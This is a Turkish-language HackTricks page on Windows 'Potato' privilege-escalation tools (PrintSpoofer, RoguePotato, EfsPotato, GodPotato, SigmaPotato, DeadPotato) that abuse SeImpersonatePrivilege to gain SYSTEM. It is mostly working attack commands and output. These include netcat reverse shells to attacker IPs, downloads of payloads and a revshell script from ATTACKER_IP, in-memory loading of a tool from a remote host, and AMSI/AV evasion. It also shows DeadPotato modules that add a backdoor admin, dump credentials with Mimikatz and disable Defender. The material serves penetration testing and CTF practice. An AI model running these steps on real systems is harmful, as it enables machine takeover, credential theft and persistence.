# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato,** Windows Server 2019 ve Windows 10 build 1809 ve sonrasında **çalışmaz**. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** aynı ayrıcalıklardan yararlanmak ve `NT AUTHORITY\SYSTEM`** düzeyinde erişim elde etmek için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 host'larında kimliğe bürünme ayrıcalıklarını kötüye kullanmak için kullanılabilen `PrintSpoofer` aracını ayrıntılı olarak ele alıyor.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025'te sık sık güncellenen modern bir alternatif SigmaPotato'dur (GodPotato'nun bir fork'u); bellek içi/.NET reflection kullanımını ve genişletilmiş işletim sistemi desteğini ekler. Aşağıdaki hızlı kullanıma ve References bölümündeki depoya bakın.

Arka plan ve manuel teknikler için ilgili sayfalar:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve sık karşılaşılan sorunlar

Aşağıdaki tekniklerin tümü, şu ayrıcalıklardan birine sahip bir bağlamdan kimliğe bürünme yeteneği olan ayrıcalıklı bir hizmetin kötüye kullanılmasına dayanır:

- SeImpersonatePrivilege (en yaygın olanı) veya SeAssignPrimaryTokenPrivilege
- Token'da zaten SeImpersonatePrivilege varsa yüksek bütünlük düzeyi gerekmez (IIS AppPool, MSSQL vb. birçok hizmet hesabında yaygın olarak görülür)

Ayrıcalıkları hızlıca kontrol edin:

```cmd
whoami /priv | findstr /i impersonate
```

Operasyonel notlar:

- Shell'iniz SeImpersonatePrivilege içermeyen kısıtlı bir token ile çalışıyorsa (bazı bağlamlarda Local Service/Network Service için yaygındır), FullPowers kullanarak hesabın varsayılan ayrıcalıklarını geri kazanın, ardından bir Potato çalıştırın. Örnek: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Bir process token'ı, aynı service account veya logon session için başka bir token'dan daha az ayrıcalığa sahip olabilir. Bazı yapılandırmalarda, aynı oturumdaki named-pipe istemcisi SeImpersonatePrivilege içeren farklı bir token'ı açığa çıkarabilir; ancak service'in yapılandırılmış `RequiredPrivileges` değeri ve `whoami /priv` çıktısı farklı şeyleri tanımlar ve böyle bir token'ın kullanılabilir olduğunu kanıtlamaz. Bir impersonation yolunu değerlendirmeden önce gerçek token'ı doğrulayın.
- PrintSpoofer, Print Spooler service'inin çalışıyor olmasını ve yerel RPC endpoint'i (spoolss) üzerinden erişilebilir olmasını gerektirir. PrintNightmare sonrasında Spooler'ın devre dışı bırakıldığı hardening uygulanmış ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato'yu tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilen bir OXID resolver gerektirir. Egress engellenmişse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Kullanılan build'in desteklediği flag'leri kontrol edin.
- EfsPotato/SharpEfsPotato, MS-EFSR'ı kötüye kullanır; bir pipe engellenmişse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- `RpcBindingSetAuthInfo` sırasında alınan 0x6d3 hatası genellikle bilinmeyen/desteklenmeyen bir RPC authentication service olduğunu gösterir; farklı bir pipe/transport deneyin veya hedef service'in çalıştığından emin olun.
- DeadPotato gibi “her şeyi içeren” fork'lar, diske yazan ek payload modülleri (Mimikatz/SharpHound/Defender off) içerir; yalın orijinallere kıyasla EDR tarafından daha yüksek tespit olasılığı bekleyin.

## Hızlı Demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notlar:
- Mevcut konsolda etkileşimli bir işlem başlatmak için `-i`, tek satırlık komut çalıştırmak için `-c` kullanabilirsiniz.
- Spooler hizmeti gereklidir. Devre dışıysa bu başarısız olur.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream usage](https://github.com/antonioCoco/RoguePotato#usage) içinde `-e` komutu belirtir, `-l` yerel resolver portunu seçer ve isteğe bağlı `-c` bir CLSID seçer. COM activation, yürütülebilir dosya yolu önceden değiştirilmiş bir hizmeti başlatırsa bu hizmet, token impersonation'dan bağımsız olarak değiştirilmiş komutunu çalıştırabilir; gözlemlenen SYSTEM çalıştırmasını bu tekniğe bağlamadan önce hizmet yapılandırmasını inceleyin.

Giden 135 engelliyse, redirector'ınızda socat kullanarak OXID resolver'ı yönlendirin:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato, Spooler/BITS yerine **PrintNotify** hizmetini hedefleyen ve 2022'nin sonlarında yayımlanan daha yeni bir COM abuse primitive'dir. İkili dosya PrintNotify COM server'ını başlatır, sahte bir `IUnknown` nesnesiyle değiştirir ve ardından `CreatePointerMoniker` aracılığıyla ayrıcalıklı bir callback tetikler. **SYSTEM** olarak çalışan PrintNotify hizmeti geri bağlandığında, işlem döndürülen token'ı çoğaltır ve sağlanan payload'ı tam ayrıcalıklarla başlatır.<sup>[[13]](#references)</sup>

Önemli kullanım notları:

* Print Workflow/PrintNotify hizmeti yüklü olduğu sürece Windows 10/11 ve Windows Server 2012–2022'de çalışır (PrintNightmare sonrasında eski Spooler devre dışı bırakılsa bile hizmet bulunur).
* Çağıran bağlamın **SeImpersonatePrivilege** ayrıcalığına sahip olması gerekir (IIS APPPOOL, MSSQL ve zamanlanmış görev hizmet hesapları için tipiktir).
* Doğrudan komut veya özgün konsolda kalmanızı sağlayan etkileşimli mod kabul eder. Örnek:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Tamamen COM tabanlı olduğu için adlandırılmış kanal dinleyicileri veya harici yönlendiriciler gerekmez; bu da onu Defender'ın RoguePotato'nun RPC bağlamasını engellediği ana bilgisayarlarda doğrudan ikame olarak kullanılabilir hâle getirir.

Ink Dragon gibi operatörler, ShadowPad'i yüklemeden önce `w3wp.exe` çalışanından SYSTEM'e geçiş yapmak için SharePoint'te ViewState RCE elde ettikten hemen sonra PrintNotifyPotato'yu çalıştırır.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

İpucu: Bir pipe başarısız olursa veya EDR engellerse, desteklenen diğer pipe'ları deneyin:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Notlar:
- SeImpersonatePrivilege mevcutsa Windows 8/8.1–11 ve Server 2012–2022 sürümlerinde çalışır.
- Yüklü runtime ile eşleşen binary'yi alın (ör. modern Server 2022'de `GodPotato-NET4.exe`).
- İlk çalıştırma yönteminiz kısa zaman aşımına sahip bir webshell/UI ise payload'ı script olarak hazırlayın ve uzun bir inline komut yerine GodPotato'dan bunu çalıştırmasını isteyin.<sup>[[12]](#references)</sup>

Yazılabilir bir IIS webroot'tan hızlı hazırlama yöntemi:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE değerini kullanan hizmet DCOM nesnelerini hedefleyen iki varyant sunar. Sağlanan binary dosyalarını derleyin veya kullanın ve komutunuzu çalıştırın:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (güncellenmiş GodPotato fork'u)

SigmaPotato, .NET reflection aracılığıyla bellek içi çalıştırma ve bir PowerShell reverse shell yardımcısı gibi modern özellikler ekler.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 sürümlerindeki ek avantajlar (v1.2.x):
- Yerleşik reverse shell bayrağı `--revshell` ve 1024 karakterlik PowerShell sınırının kaldırılması sayesinde uzun AMSI atlatma payload'larını tek seferde çalıştırabilirsiniz.
- Reflection ile uyumlu söz dizimi (`[SigmaPotato]::Main()`) ve basit sezgisel denetimleri yanıltmaya yönelik `VirtualAllocExNuma()` üzerinden uygulanan temel bir AV atlatma yöntemi.
- PowerShell Core ortamları için .NET 2.0'a karşı derlenmiş ayrı bir `SigmaPotatoCore.exe`.

### DeadPotato (2024'te modüllerle yeniden işlenen GodPotato)

DeadPotato, GodPotato'nun OXID/DCOM impersonation zincirini korurken operatörlerin ek araçlara ihtiyaç duymadan hemen SYSTEM yetkisi alıp kalıcılık ve veri toplama işlemleri gerçekleştirebilmesi için post-exploitation yardımcılarını da içerir.<sup>[[15]](#references)</sup>

Yaygın modüller (tümü SeImpersonatePrivilege gerektirir):

- `-cmd "<cmd>"` — SYSTEM olarak rastgele bir komut çalıştırır.
- `-rev <ip:port>` — hızlı bir reverse shell açar.
- `-newadmin user:pass` — kalıcılık için yerel bir yönetici hesabı oluşturur.
- `-mimi sam|lsa|all` — kimlik bilgilerini dökmek için Mimikatz'ı diske bırakıp çalıştırır (diske yazma yapar ve gürültülüdür).
- `-sharphound` — SharpHound'u SYSTEM olarak çalıştırıp veri toplar.
- `-defender off` — Defender'ın gerçek zamanlı korumasını kapatır (çok gürültülüdür).

Örnek tek satırlık komutlar:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Ek ikili dosyalarla birlikte geldiğinden daha fazla AV/EDR uyarısı bekleyin; gizlilik önemliyse daha hafif GodPotato/SigmaPotato kullanın.

## References

- [1] [PrintSpoofer – Windows 10 ve Server 2019'da Impersonation Privileges'ın kötüye kullanılması](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Artık JuicyPotato yok mu? Eski hikaye, RoguePotato'ya hoş geldiniz](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Service account'lar için varsayılan token privileges'ı geri yükleme](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → webroot'a NTFS junction → SYSTEM olmak için FullPowers + GodPotato](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → SYSTEM olmak için GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon'ın iç yüzü: Gizli bir saldırı operasyonunun relay ağı ve işleyişi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Dahili post-ex modülleriyle GodPotato'nun yeniden işlenmiş sürümü](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
